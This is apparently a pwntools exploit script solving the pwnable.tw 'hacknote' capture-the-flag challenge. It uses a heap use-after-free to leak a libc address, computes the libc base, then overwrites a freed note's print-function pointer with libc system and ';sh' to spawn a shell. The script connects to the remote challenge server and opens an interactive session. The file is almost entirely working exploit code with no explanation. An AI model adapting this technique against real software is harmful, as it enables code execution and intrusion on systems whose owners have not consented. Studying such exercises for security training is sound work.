#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('hacknote_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x08048923 
        b*0x08048879
        c
        ''')
        sleep(1)
# nc chall.pwnable.tw 10102

if args.REMOTE:
    p = remote('chall.pwnable.tw', 10102)
else:
    p = process([exe.path])
GDB()

def create(size, data):
    slna(b'our choice :', 1)
    slna(b'Note size :', size)
    sa(b'Content :', data)

def delete(idx):
    slna(b'our choice :', 2)
    slna(b'Index :', idx)

def out(idx):
    slna(b'our choice :', 3)
    slna(b'Index :', idx)

create(0x500, b'a')
create(0x50, b'a')
delete(0)
create(0x500, p8(0xb0))
out(0)

libc_leak = u32(r(4))
libc.address = libc_leak - 0x1b07b0
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')
delete(0)
delete(1)
# 0x1b07b0

# create(0x10, b'ehehe')
# create(0x10, b'ehehe')
# delete(0)
# delete(1)
load = flat(
    libc.sym.system,
    b';sh\0'
)

create(0x10, load) # 4

# slna(b'our choice :', 3)
# slna(b'Index :', 0)
p.interactive()
